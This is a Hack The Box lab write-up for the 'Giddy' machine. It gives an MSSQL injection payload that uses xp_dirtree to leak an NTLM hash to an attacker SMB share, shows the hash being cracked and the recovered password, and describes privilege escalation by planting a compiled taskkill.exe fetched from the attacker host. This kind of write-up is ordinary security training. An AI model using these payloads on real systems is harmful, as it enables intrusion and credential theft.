# Giddy
[![Giddy](https://www.hackthebox.eu/storage/avatars/cd0f72b791b481e72b7099668409a6a8.png)](https://www.hackthebox.eu/home/machines/profile/153)

## Initial Foothold
### Nmap
We run nmap.
```sh
Discovered open port 80/tcp on 10.10.10.104
Discovered open port 443/tcp on 10.10.10.104
Discovered open port 3389/tcp on 10.10.10.104
```
Nothing really to get from the home page of the website. So we run wfuzz (or dirb) and set ***big.txt*** as default list.
```sh
$ wfuzz -c -w /usr/share/dirb/wordlists/big.txt --hc 404 10.10.10.104/FUZZ

002693:  C=301      1 L	      10 W	    157 Ch	  "aspnet_client"
012203:  C=301      1 L	      10 W	    147 Ch	  "mvc"
015243:  C=302      3 L	       8 W	    157 Ch	  "remote"
```
We navigate to http://10.10.10.104/mvc and we can see that search field is vulnerable to MSSQL injection. [This](https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478) article show as the way to get some useful information by exploiting this vulnerability. First we download Impackets.
```sh
$ git clone https://github.com/SecureAuthCorp/impacket.git
$ python impacket/examples/smbserver.py -smb2support myshare /Impacket
```
In the search field we put the following and wait for the results:
```
$ ' EXEC master.sys.xp_dirtree '\\10.10.14.18\myshare',1,1;
```
We put the results into a [file](./files/hash.txt) so we can crack it with hashcat.
```ssh
$ hashcat -m 5600 hash.txt -o hash.crkd /usr/share/wordlists/rockyou.txt --force
$ cat hash.crkd
xNnWo6272k7x
```
We then navigate to https://10.10.10.104/remote and login with the credentials we got from the injection we did before.
```
User name: GIDDY\stacy
Password: xNnWo6272k7x
Computer name: GIDDY
```
Once we are logged in, we get the user.
```sh
$ more ..\Desktop\user.txt
```

## Privesc
If we search for hidden files in "C:\\" directory we will find ***ProgramData***
```sh
$ ls -h
```
Inside the directory "C:\ProgramData\unifi-video\", there is a program called ***UniFiVideo***. Once again "Google is a friend!". Indeed, a little search and we come up with [this](https://www.exploit-db.com/exploits/43390). So we are gonna create a file with the name ***[taskkill.exe](./files/taskkill.exe)*** and place inside the same directory. Locally we compile the file.
```sh
$ apt-get install mingw-w64
$ x86_64-w64-mingw32-gcc copy.c -o taskkill.exe
```
After compiling our script we put it in our local Apache server so we can download it on the remote machine.
```sh
$ cp taskkill.exe /var/www/html/taskkill.exe
$ wget http://10.10.14.18/diafora/copy -UseBasicParsing -OutFile taskkill.exe
```
Back to the remote again we run the commands bellow to make it run our script.
```sh
$ get-service "Ubiquiti UniFi Video"
$ restart-service "Ubiquiti UniFi Video"
```
Finally we can read the root.txt file.
```sh
$ more C:\Users\stacy\Desktop\root.txt
```

[![bertolis](https://www.hackthebox.eu/badge/image/27897)](https://www.hackthebox.eu/home/users/profile/27897)  [![Giddy](https://www.hackthebox.eu/images/logofull-tr-web.png)](https://www.hackthebox.eu/)
